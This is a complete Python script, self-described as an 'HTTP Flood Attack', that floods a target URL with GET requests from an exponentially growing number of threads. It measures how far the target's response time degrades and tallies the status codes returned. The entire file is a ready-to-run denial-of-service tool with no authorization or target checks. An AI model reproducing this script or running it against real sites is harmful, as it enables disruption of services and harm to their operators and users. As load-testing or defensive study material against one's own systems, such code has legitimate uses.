#!/bin/python3

'''
HTTP Flood Attack
'''

import sys
import threading
import time
import math
import requests


class ResponseTimeChecker:
    ''' ResponseTimeChecker class'''

    url: str
    count: int
    delay: float

    def __init__(self, url, count, delay):
        self.url = url
        self.count = count
        self.delay = delay

    def measure_response_time(self):
        ''' Measure response time for one request '''
        req = requests.get(self.url)

        return req.elapsed.total_seconds()

    def measure_average_response_time(self):
        ''' Measure average response time '''

        total_time = 0
        num_requests = 0

        print('Measuring response time...')
        for _ in range(self.count):
            total_time += self.measure_response_time()
            num_requests += 1
            time.sleep(self.delay)
        print('Response time measured!')

        return total_time / num_requests


class HTTPFloodRunner:
    ''' HTTPFloodRunner class'''

    url: str

    threads: list
    lock: threading.Lock
    stop_threads: bool

    requests_count: int
    status_code_count: dict

    def __init__(self, url):
        self.lock = threading.Lock()
        self.stop_threads = False
        self.status_code_count = {}
        self.requests_count = 0
        self.threads = []
        self.url = url

    def thread_func(self):
        ''' Thread function '''

        num_requests = 0
        status_code_count = {}

        while not self.stop_threads:
            req = requests.get(self.url)
            status_code = req.status_code

            num_requests += 1

            if status_code not in status_code_count:
                status_code_count[status_code] = 1
            else:
                status_code_count[status_code] += 1

        with self.lock:
            self.requests_count += num_requests
            for status_code, count in status_code_count.items():
                if status_code not in self.status_code_count:
                    self.status_code_count[status_code] = count
                else:
                    self.status_code_count[status_code] += count

    def start(self, num_threads):
        ''' Start the http flood attack '''

        self.stop_threads = False

        print(f'Spawning {num_threads} threads...')
        self.threads = []

        for i in range(num_threads):
            self.threads.append(threading.Thread(target=self.thread_func))
            self.threads[i].start()

    def stop(self):
        ''' Stop the attack '''

        print(f'Stopping {len(self.threads)} threads...')

        self.stop_threads = True

        for thread in self.threads:
            thread.join()


def main(argv):
    ''' Main function '''

    if len(argv) != 5:
        print(f'Usage: {argv[0]} <url> <count> <delay> <max_threads>')
        return 1

    url = argv[1]
    count = int(argv[2])
    delay = float(argv[3])
    max_threads = int(argv[4])

    checker = ResponseTimeChecker(url, count, delay)
    runner = HTTPFloodRunner(url)

    response_times = {}

    response_times[0] = checker.measure_average_response_time()
    print()

    for i in range(int(math.log2(max_threads)) + 1):
        runner.start(2 ** i)
        time.sleep(3)
        response_times[2 ** i] = checker.measure_average_response_time()
        runner.stop()

        print()

    print('Http Flood response times:')
    for num_threads, response_time in response_times.items():
        print(f'{num_threads:7d} threads - {response_time:.6f}s')

    print(f'Http Flood total requests: {runner.requests_count}')
    for status_code in sorted(runner.status_code_count):
        print(
            f'{status_code:7d} - {runner.status_code_count[status_code]} req')

    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
